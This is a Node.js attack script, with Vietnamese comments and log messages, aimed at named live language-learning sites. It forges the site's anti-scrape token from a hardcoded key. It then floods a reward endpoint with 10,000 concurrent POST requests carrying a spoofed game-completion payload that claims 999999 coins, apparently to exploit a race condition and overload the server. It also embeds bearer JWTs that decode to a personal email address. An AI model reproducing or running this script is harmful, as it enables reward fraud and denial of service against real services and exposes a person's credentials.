const crypto = require('crypto');

const TARGET_URL = "https://luyentu.com/shop/reward";
// const TARGET_URL = "https://tiengtrung.luyentu.com/shop/reward";
// const TARGET_URL = "https://nguphap.luyentu.com/";
// const TARGET_URL = "https://dautoeic.com/";
const AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjU5NDE5LCJlbWFpbCI6ImtpdHRlbndhcnJpb3IyMDA1QGdtYWlsLmNvbSIsImlhdCI6MTc3NjA1MTQ5MiwiZXhwIjoxNzc2MDUyMzkyfQ.3e7jgkQZ0GM9Rj9T79RuKOE_121T5_EMktA2IWmzSI0"; // Token của bạn
// const AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMwMDgsImVtYWlsIjoia2l0dGVud2FycmlvcjIwMDVAZ21haWwuY29tIiwiaWF0IjoxNzc2MDY0ODM3LCJleHAiOjE3NzYwNjU3Mzd9.XXwIDQTRLDItFXLPR5AmtoYN4Sj0as0BWRbqgZdK7Vw"; // Token của bạn
const CONCURRENCY = 1000;
const TOTAL_REQUESTS = 10000; 

const ANTI_SCRAPE_KEY = "luyentu-anti-scrape-2026";

function generateAppToken() {
    const e = Date.now().toString();
    const hash = crypto.createHmac('sha256', ANTI_SCRAPE_KEY).update(e).digest('hex').substring(0, 16);
    return `${e}.${hash}`;
}

async function fire() {
    const payload = {
        type: "game_completion",
        accuracy: 100,
        learnedCount: 50,
        totalGameCoins: 999999
    };

    try {
        const start = Date.now();
        const res = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN,
                'X-App-Token': generateAppToken()
            },
            body: JSON.stringify(payload)
        });
        const duration = Date.now() - start;
        return { status: res.status, time: duration };
    } catch (e) {
        return { status: "SẬP/NGHẼN", time: 0 };
    }
}

async function startEngine() {
    console.log(`%c🚀 Đang khởi động hạm đội 1000 quân ảo...`, "color: cyan; font-weight: bold;");
    
    let completed = 0;
    const queue = new Set();

    async function manage() {
        while (completed < TOTAL_REQUESTS) {
            if (queue.size < CONCURRENCY) {
                const p = fire().then((res) => {
                    completed++;
                    queue.delete(p);
                    if (completed % 100 === 0) {
                        console.log(`📊 Đã bắn: ${completed} | Status mới nhất: ${res.status} | Delay: ${res.time}ms`);
                    }
                });
                queue.add(p);
            } else {
                await Promise.race(queue);
            }
        }
    }

    await manage();
    console.log("🏁 Hoàn tất oanh tạc!");
}

startEngine();